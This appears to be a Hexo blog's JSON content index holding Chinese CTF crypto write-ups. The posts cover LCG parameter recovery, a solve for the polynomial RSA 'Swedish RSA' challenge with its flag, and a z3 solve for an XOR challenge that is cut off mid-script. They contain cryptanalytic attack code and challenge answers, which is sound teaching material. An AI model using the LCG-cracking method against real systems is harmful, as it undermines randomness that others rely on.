{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"https://feverhu.github.io","root":"/"},"pages":[{"title":"tags","date":"2022-08-07T02:19:56.000Z","updated":"2022-08-07T06:44:55.870Z","comments":false,"path":"tags/index.html","permalink":"https://feverhu.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-08-07T03:29:10.627Z","updated":"2022-08-07T03:29:10.627Z","comments":true,"path":"links/index.html","permalink":"https://feverhu.github.io/links/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-08-07T06:33:49.000Z","updated":"2022-08-07T06:44:47.451Z","comments":false,"path":"categories/index.html","permalink":"https://feverhu.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"解决LCG未知参数的办法","slug":"解决LCG未知参数的办法","date":"2022-09-16T03:53:58.000Z","updated":"2022-09-16T03:56:13.885Z","comments":true,"path":"2022/09/16/解决LCG未知参数的办法/","link":"","permalink":"https://feverhu.github.io/2022/09/16/%E8%A7%A3%E5%86%B3LCG%E6%9C%AA%E7%9F%A5%E5%8F%82%E6%95%B0%E7%9A%84%E5%8A%9E%E6%B3%95/","excerpt":"","text":"解决LCG未知参数问题的办法 Dawn_whisper : LCG 1、线性同余生成方法 设\\(A,B,M\\)是一定常数，按照递推公式\\(state_{i + 1} =(A \\times state_i + B) \\ (\\ mod \\ M)\\) 其中A称为乘数(multiplier)，B称为增量(increment)，M称为模数(modulus) LCG的生成周期理论上应该是M，但大部分情况下会小于M，如果想要追求LCG的最大周期，应符合以下几个条件： A与B都是正整数 A、B、N[0]都比M要小 B与M互质 M的所有质因数都能整除A-1 2、攻击方法 理论上知道2个值可以知道B。3个状态值可以知道A和B。7个状态值可能知道A,B,M。 1234567891011121314151617181920212223242526272829class lcg_attack: # unknown B (increment) def lcgattack1(self, states, modulus, multiplier): if(len(states)&lt;2): raise Exception(&quot;#####Invalid lenth of states! The lenth should be 2 at least!##### - Dawn_whisper&quot;) increment = (states[1] - states[0] * multiplier) % modulus return &#123;&#x27;multiplier&#x27;:int(multiplier), &#x27;increment&#x27;:int(increment), &#x27;modulus&#x27;:int(modulus)&#125; # unknown A (multiplier) def lcgattack2(self, states, modulus): if(len(states)&lt;3): raise Exception(&quot;#####Invalid lenth of states! The lenth should be 3 at least!##### - Dawn_whisper&quot;) multiplier = (states[2] - states[1]) * inverse(states[1] - states[0], modulus) % modulus return self.lcgattack1(states, modulus, multiplier) # unknown M (modulus) def lcgattack3(self, states): if(len(states)&lt;6): raise Exception(&quot;#####Invalid lenth of states! The lenth should be 6 at least!##### - Dawn_whisper&quot;) diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return self.lcgattack2(states, modulus)作者: Dawn_whisper链接: https://dawnwhisper.github.io/2021/03/04/LCG/来源: Dawn_whisper&#x27;s blog著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://feverhu.github.io/categories/Crypto/"}],"tags":[{"name":"LCG","slug":"LCG","permalink":"https://feverhu.github.io/tags/LCG/"}]},{"title":"多项式RSA NTRU","slug":"多项式RSA-NTRU","date":"2022-09-02T16:08:24.000Z","updated":"2022-09-04T09:25:06.312Z","comments":true,"path":"2022/09/03/多项式RSA-NTRU/","link":"","permalink":"https://feverhu.github.io/2022/09/03/%E5%A4%9A%E9%A1%B9%E5%BC%8FRSA-NTRU/","excerpt":"","text":"多项式RSA 整数RSA加解密原理 多项式RSA推倒 在上面RSA原理的基础上将多项式的代入整数进行分析。 引用：以上原理、推导 phi的问题 不可约多项式的欧拉函数求法：回到欧拉函数定义本身，欧拉函数是小于或等于n的正整数中与n互素的数的数目。 再看不可约多项式p(x)，除了0，长度为n每一个多项式都与p(x)互素，因此 明文与多项式系数 加密： 将明文每个字符转ascii，每一位对应一项多项式的系数。 解密： 将每一位多项式系数转换为ascii，连起来就是原文。 12m = pow(c, d, N) m = \"\".join([chr(c) for c in m.list()]) 例题：[watevrCTF 2019]Swedish RSA 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849flag = bytearray(raw_input())flag = list(flag)length = len(flag)bits = 16## Prime for Finite Field.p = random_prime(2^bits-1, False, 2^(bits-1))file_out = open(\"downloads/polynomial_rsa.txt\", \"w\")file_out.write(\"Prime: \" + str(p) + \"\\n\")## Univariate Polynomial Ring in y over Finite Field of size pR.&lt;y&gt; = PolynomialRing(GF(p))## Analogous to the primes in Zdef gen_irreducable_poly(deg): while True: out = R.random_element(degree=deg) if out.is_irreducible(): return out## Polynomial \"primes\"P = gen_irreducable_poly(ZZ.random_element(length, 2*length))Q = gen_irreducable_poly(ZZ.random_element(length, 2*length))## Public exponent keye = 65537## ModulusN = P*Qfile_out.write(\"Modulus: \" + str(N) + \"\\n\")## Univariate Quotient Polynomial Ring in x over Finite Field of size 659 with modulus N(x)S.&lt;x&gt; = R.quotient(N)## Encryptm = S(flag)c = m^efile_out.write(\"Ciphertext: \" + str(c))file_out.close()'''Prime: 43753Modulus: 34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814Ciphertext: 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659''' exp.sage: 1234567891011121314151617R.&lt;y&gt; = PolynomialRing(GF(43753))N = R(\"34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814\")print(factor(N))e = 65537phi = (43753^65-1)*(43753^112-1)d = inverse_mod(e, phi)C = R(\"5209*y^176 + 10881*y^175 + 31096*y^174 + 23354*y^173 + 28337*y^172 + 15982*y^171 + 13515*y^170 + 21641*y^169 + 10254*y^168 + 34588*y^167 + 27434*y^166 + 29552*y^165 + 7105*y^164 + 22604*y^163 + 41253*y^162 + 42675*y^161 + 21153*y^160 + 32838*y^159 + 34391*y^158 + 832*y^157 + 720*y^156 + 22883*y^155 + 19236*y^154 + 33772*y^153 + 5020*y^152 + 17943*y^151 + 26967*y^150 + 30847*y^149 + 10306*y^148 + 33966*y^147 + 43255*y^146 + 20342*y^145 + 4474*y^144 + 3490*y^143 + 38033*y^142 + 11224*y^141 + 30565*y^140 + 31967*y^139 + 32382*y^138 + 9759*y^137 + 1030*y^136 + 32122*y^135 + 42614*y^134 + 14280*y^133 + 16533*y^132 + 32676*y^131 + 43070*y^130 + 36009*y^129 + 28497*y^128 + 2940*y^127 + 9747*y^126 + 22758*y^125 + 16615*y^124 + 14086*y^123 + 13038*y^122 + 39603*y^121 + 36260*y^120 + 32502*y^119 + 17619*y^118 + 17700*y^117 + 15083*y^116 + 11311*y^115 + 36496*y^114 + 1300*y^113 + 13601*y^112 + 43425*y^111 + 10376*y^110 + 11551*y^109 + 13684*y^108 + 14955*y^107 + 6661*y^106 + 12674*y^105 + 21534*y^104 + 32132*y^103 + 34135*y^102 + 43684*y^101 + 837*y^100 + 29311*y^99 + 4849*y^98 + 26632*y^97 + 26662*y^96 + 10159*y^95 + 32657*y^94 + 12149*y^93 + 17858*y^92 + 35805*y^91 + 19391*y^90 + 30884*y^89 + 42039*y^88 + 17292*y^87 + 4694*y^86 + 1497*y^85 + 1744*y^84 + 31071*y^83 + 26246*y^82 + 24402*y^81 + 22068*y^80 + 39263*y^79 + 23703*y^78 + 21484*y^77 + 12241*y^76 + 28821*y^75 + 32886*y^74 + 43075*y^73 + 35741*y^72 + 19936*y^71 + 37219*y^70 + 33411*y^69 + 8301*y^68 + 12949*y^67 + 28611*y^66 + 42654*y^65 + 6910*y^64 + 18523*y^63 + 31144*y^62 + 21398*y^61 + 36298*y^60 + 27158*y^59 + 918*y^58 + 38601*y^57 + 4269*y^56 + 5699*y^55 + 36444*y^54 + 34791*y^53 + 37978*y^52 + 32481*y^51 + 8039*y^50 + 11012*y^49 + 11454*y^48 + 30450*y^47 + 1381*y^46 + 32403*y^45 + 8202*y^44 + 8404*y^43 + 37648*y^42 + 43696*y^41 + 34237*y^40 + 36490*y^39 + 41423*y^38 + 35792*y^37 + 36950*y^36 + 31086*y^35 + 38970*y^34 + 12439*y^33 + 7963*y^32 + 16150*y^31 + 11382*y^30 + 3038*y^29 + 20157*y^28 + 23531*y^27 + 32866*y^26 + 5428*y^25 + 21132*y^24 + 13443*y^23 + 28909*y^22 + 42716*y^21 + 6567*y^20 + 24744*y^19 + 8727*y^18 + 14895*y^17 + 28172*y^16 + 30903*y^15 + 26608*y^14 + 27314*y^13 + 42224*y^12 + 42551*y^11 + 37726*y^10 + 11203*y^9 + 36816*y^8 + 5537*y^7 + 20301*y^6 + 17591*y^5 + 41279*y^4 + 7999*y^3 + 33753*y^2 + 34551*y + 9659\")m = pow(C, d, N)m = \"\".join([chr(c) for c in m.list()])print(m)#watevr{RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro}#flag{RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro} 另一篇很好的讲解：多项式RSA exp.sage: 12345678910111213141516171819#!/usr/bin/env sage# -*- coding: utf-8 -*-p = 43753R.&lt;x&gt; = PolynomialRing(GF(p))N = 34036*x^177 + 23068*x^176 + 13147*x^175 + 36344*x^174 + 10045*x^173 + 41049*x^172 + 17786*x^171 + 16601*x^170 + 7929*x^169 + 37570*x^168 + 990*x^167 + 9622*x^166 + 39273*x^165 + 35284*x^164 + 15632*x^163 + 18850*x^162 + 8800*x^161 + 33148*x^160 + 12147*x^159 + 40487*x^158 + 6407*x^157 + 34111*x^156 + 8446*x^155 + 21908*x^154 + 16812*x^153 + 40624*x^152 + 43506*x^151 + 39116*x^150 + 33011*x^149 + 23914*x^148 + 2210*x^147 + 23196*x^146 + 43359*x^145 + 34455*x^144 + 17684*x^143 + 25262*x^142 + 982*x^141 + 24015*x^140 + 27968*x^139 + 37463*x^138 + 10667*x^137 + 39519*x^136 + 31176*x^135 + 27520*x^134 + 32118*x^133 + 8333*x^132 + 38945*x^131 + 34713*x^130 + 1107*x^129 + 43604*x^128 + 4433*x^127 + 18110*x^126 + 17658*x^125 + 32354*x^124 + 3219*x^123 + 40238*x^122 + 10439*x^121 + 3669*x^120 + 8713*x^119 + 21027*x^118 + 29480*x^117 + 5477*x^116 + 24332*x^115 + 43480*x^114 + 33406*x^113 + 43121*x^112 + 1114*x^111 + 17198*x^110 + 22829*x^109 + 24424*x^108 + 16523*x^107 + 20424*x^106 + 36206*x^105 + 41849*x^104 + 3584*x^103 + 26500*x^102 + 31897*x^101 + 34640*x^100 + 27449*x^99 + 30962*x^98 + 41434*x^97 + 22125*x^96 + 24314*x^95 + 3944*x^94 + 18400*x^93 + 38476*x^92 + 28904*x^91 + 27936*x^90 + 41867*x^89 + 25573*x^88 + 25659*x^87 + 33443*x^86 + 18435*x^85 + 5934*x^84 + 38030*x^83 + 17563*x^82 + 24086*x^81 + 36782*x^80 + 20922*x^79 + 38933*x^78 + 23448*x^77 + 10599*x^76 + 7156*x^75 + 29044*x^74 + 23605*x^73 + 7657*x^72 + 28200*x^71 + 2431*x^70 + 3860*x^69 + 23259*x^68 + 14590*x^67 + 33631*x^66 + 15673*x^65 + 36049*x^64 + 29728*x^63 + 22413*x^62 + 18602*x^61 + 18557*x^60 + 23505*x^59 + 17642*x^58 + 12595*x^57 + 17255*x^56 + 15316*x^55 + 8948*x^54 + 38*x^53 + 40329*x^52 + 9823*x^51 + 5798*x^50 + 6379*x^49 + 8662*x^48 + 34640*x^47 + 38321*x^46 + 18760*x^45 + 13135*x^44 + 15926*x^43 + 34952*x^42 + 28940*x^41 + 13558*x^40 + 42579*x^39 + 38015*x^38 + 33788*x^37 + 12381*x^36 + 195*x^35 + 13709*x^34 + 31500*x^33 + 32994*x^32 + 30486*x^31 + 40414*x^30 + 2578*x^29 + 30525*x^28 + 43067*x^27 + 6195*x^26 + 36288*x^25 + 23236*x^24 + 21493*x^23 + 15808*x^22 + 34500*x^21 + 6390*x^20 + 42994*x^19 + 42151*x^18 + 19248*x^17 + 19291*x^16 + 8124*x^15 + 40161*x^14 + 24726*x^13 + 31874*x^12 + 30272*x^11 + 30761*x^10 + 2296*x^9 + 11017*x^8 + 16559*x^7 + 28949*x^6 + 40499*x^5 + 22377*x^4 + 33628*x^3 + 30598*x^2 + 4386*x + 23814c = 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659S.&lt;x&gt; = R.quotient(N)P, Q = N.factor()P, Q = P[0], Q[0]phi = (p ** P.degree() - 1) * (p ** Q.degree() - 1)e = 0x10001d = inverse_mod(e, phi)m = pow(c, d, N)m = \"\".join([chr(c) for c in m.list()])print(m) NTRU待续","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://feverhu.github.io/categories/Crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://feverhu.github.io/tags/RSA/"},{"name":"NTURE","slug":"NTURE","permalink":"https://feverhu.github.io/tags/NTURE/"}]},{"title":"2022 长城杯政企组 wp","slug":"2022-长城杯政企组-wp","date":"2022-08-25T16:05:23.000Z","updated":"2022-08-25T18:25:59.878Z","comments":true,"path":"2022/08/26/2022-长城杯政企组-wp/","link":"","permalink":"https://feverhu.github.io/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/","excerpt":"","text":"2022 长城杯政企组 wp 这次比赛实际并列26名，前15名进入线下复赛，感觉距离线下赛越来越近了。Crypto简单题秒了，因为上班没有抢到前三拿加分，最后这道题第五。然后其余四个小时全部给了re的rabbit_hole，把大致的流程梳理出来了，但是卡在了异常处理，导致最后核心代码没有能够看到并且F5解析。队友做出来web题，赛后看了看misc的办公室爱情，也没用多少时间。如果比赛时候做了说不定就进复赛了？不可能的！没看规则，完全没有记得开录屏。马上打网鼎杯，不要忘了！ 那天打完比赛，Re没做出来实在气不过，于是联系了好多年不联系传奇人物刘大爷，请刘大爷出山给我指点迷津，刘大爷把题秒了，给我讲了两点，立马全都解决了，果然是刘大爷，这个wp大部分功劳是刘大爷的。 Crypto - xor task.py: 12345678910111213141516171819202122232425262728import osfrom secret import flagdef cut(obj, sec): return [obj[i:i+sec] for i in range(0,len(obj),sec)]x = 6assert flag.startswith(&#x27;flag&#123;&#x27;)assert flag.endswith(&#x27;&#125;&#x27;)m = cut(flag, x)pad = os.urandom(x)res = []for i in m: tmp = [] tmp.append(i[0] ^ i[1] ^ i[2] ^ pad[0]) tmp.append(i[3] ^ i[4] ^ pad[1] ^ pad[2]) tmp.append(pad[5] ^ i[5] ^ pad[1] ^ pad[3]) tmp.append(i[3] ^ pad[3] ^ pad[4] ^ pad[1]) tmp.append(i[5] ^ pad[0] ^ i[4] ^ pad[1]) tmp.append(i[2] ^ i[4] ^ pad[0] ^ pad[1]) tmp.append(i[2] ^ i[0] ^ i[4] ^ pad[4]) res.append(tmp)print(res)#[[150, 194, 49, 195, 23, 79, 66], [194, 136, 63, 147, 3, 2, 81], [132, 221, 57, 144, 83, 83, 93], [208, 223, 37, 193, 28, 0, 70], [154, 203, 108, 156, 28, 78, 68], [159, 221, 62, 146, 86, 82, 88], [197, 141, 117, 192, 31, 90, 85]] 入门题目，“flag{”是flag的前5位，然后是一个7元的方程，求pad6个数和flag{后一位有7个方程正好可以解。用z3即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from z3 import *##求random，已知前5位是flag&#123;i = b&quot;flag&#123;&quot;so = Solver()ans = [150, 194, 49, 195, 23, 79, 66]flag5 = BitVec(&#x27;flag5&#x27;,8)pad = [BitVec(f&#x27;pad&#123;i&#125;&#x27;,8) for i in range(6)]so.add(i[0] ^ i[1] ^ i[2] ^ pad[0] == ans[0])so.add(i[3] ^ i[4] ^ pad[1] ^ pad[2] == ans[1])so.add(pad[5] ^ flag5 ^ pad[1] ^ pad[3] == ans[2])so.add(i[3] ^ pad[3] ^ pad[4] ^ pad[1] == ans[3])so.add(flag5 ^ pad[0] ^ i[4] ^ pad[1] == ans[4])so.add(i[2] ^ i[4] ^ pad[0] ^ pad[1] == ans[5])so.add(i[2] ^ i[0] ^ i[4] ^ pad[4] == ans[6])pad_ = []if so.check() == sat: m = so.model() for k in range(6): #print(m.eval(pad[k]).as_long()) pad_.append(m.eval(pad[k]).as_long())#print(pad_)#[253, 168, 118, 50, 62, 146]ans = [[150, 194, 49, 195, 23, 79, 66], [194, 136, 63, 147, 3, 2, 81], [132, 221, 57, 144, 83, 83, 93], [208, 223, 37, 193, 28, 0, 70], [154, 203, 108, 156, 28, 78, 68], [159, 221, 62, 146, 86, 82, 88], [197, 141, 117, 192, 31, 90, 85]]flag_ = &quot;&quot;pad = pad_for i in ans: so = Solver() flag = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(6)] so.add(flag[0] ^ flag[1] ^ flag[2] ^ pad[0] == i[0]) so.add(flag[3] ^ flag[4] ^ pad[1] ^ pad[2] == i[1]) so.add(pad[5] ^ flag[5] ^ pad[1] ^ pad[3] == i[2]) so.add(flag[3] ^ pad[3] ^ pad[4] ^ pad[1] == i[3]) so.add(flag[5] ^ pad[0] ^ flag[4] ^ pad[1] == i[4]) so.add(flag[2] ^ flag[4] ^ pad[0] ^ pad[1] == i[5]) so.add(flag[2] ^ flag[0] ^ flag[4] ^ pad[4] == i[6]) if so.check() == sat: m = so.model() #print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag)) flag_ += 